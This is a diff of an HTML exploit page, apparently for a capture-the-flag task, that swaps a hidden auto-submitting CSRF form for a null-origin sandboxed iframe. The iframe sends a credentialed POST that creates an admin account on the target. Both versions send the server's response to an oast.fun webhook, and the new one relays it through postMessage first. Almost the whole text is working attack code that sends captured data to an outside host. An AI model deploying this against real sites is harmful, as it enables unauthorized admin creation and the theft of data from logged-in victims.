@@ -1,20 +1,60 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>null origin exploit</title>
+</head>
 <body>
-    <form id="exploit" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
-        <input type="hidden" name="new_admin_login" value="hacker_admin_666">
-    </form>
 
-    <script>
-        document.getElementById('exploit').submit();
+  <iframe id="exp" sandbox="allow-scripts allow-forms" style="display:none"></iframe>
 
-        // Через 2–4 секунды отправляем себе ответ (если создание админа редиректит или отдаёт что-то)
-        setTimeout(() => {
-            fetch('https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/???', {
-                method: 'POST',
-                body: document.body.innerHTML + '\n' + window.location.href
+  <script>
+    const iframe = document.getElementById('exp');
+
+    // Важно: используем srcdoc, а не src — тогда Origin будет null
+    const payload = `
+      <script>
+        async function steal() {
+          try {
+            const res = await fetch("https://tasks.goidactf.ru:20431/create_admin", {
+              method: "POST",
+              credentials: "include",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+              },
+              body: "new_admin_login=admin_god_666"
             });
-        }, 3000);
-    </script>
+
+            if (res.ok) {
+              const text = await res.text();
+              // Отправляем себе результат (токен / флаг / "Admin created" / что угодно)
+              parent.postMessage({ success: true, data: text }, "*");
+            } else {
+              parent.postMessage({ success: false, status: res.status }, "*");
+            }
+          } catch(e) {
+            parent.postMessage({ error: e.message }, "*");
+          }
+        }
+
+        // Запускаем сразу после загрузки
+        steal();
+      <\/script>
+    `;
+
+    iframe.srcdoc = payload;
+
+    // Слушаем сообщение от iframe (Origin null → postMessage к parent разрешён)
+    window.addEventListener("message", function(e) {
+      console.log("Received from null-origin iframe:", e.data);
+
+      // Пересылаем себе на webhook
+      fetch("https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(e.data)
+      });
+    });
+  </script>
+
 </body>
 </html>
